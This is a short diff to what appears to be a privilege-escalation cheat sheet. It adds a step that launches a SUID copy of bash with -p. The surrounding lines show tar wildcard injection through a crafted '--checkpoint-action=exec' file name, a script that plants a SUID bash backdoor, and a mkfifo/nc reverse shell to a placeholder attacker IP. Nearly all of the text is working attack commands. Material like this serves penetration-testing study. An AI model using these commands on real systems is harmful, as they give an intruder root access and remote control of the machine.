@@ -550,6 +550,8 @@ touch -- '--checkpoint-action=exec=sh shell.sh'
 
 echo -e '#!/bin/bash \ncp /bin/bash /home/<USER_NAME>\nchmod +s /home/<USER_NAME>/bash' > shell.sh
 
+/home/<USER_NAME>/bash -p
+
 # OR
 
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f" > shell.sh
